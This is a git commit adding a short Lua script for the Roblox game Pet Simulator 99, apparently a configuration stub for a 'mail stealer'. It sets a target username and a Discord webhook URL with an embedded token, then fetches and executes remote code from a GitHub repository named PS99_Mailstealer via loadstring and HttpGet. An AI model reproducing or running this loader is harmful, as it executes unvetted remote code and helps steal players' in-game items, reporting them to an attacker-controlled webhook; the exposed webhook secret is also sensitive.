60b5df60211c635a87a1c01f3b2e12ec49f24a39
scriptforps99hck <Cayden.Logan123@Outlook.com>
2024-12-25 17:50:59 -0500

    Add files via upload

---
+++ Petsimthing.lua
@@ -0,0 +1,5 @@
+Username = "altultbult_5"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1321175480694603817/3fjWlTyHGn7AbcbZwP9wJpi3IIbuodCOMHUahsmsDalBPrKDO0XYtdNFxjHK5MoJ_Axo" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
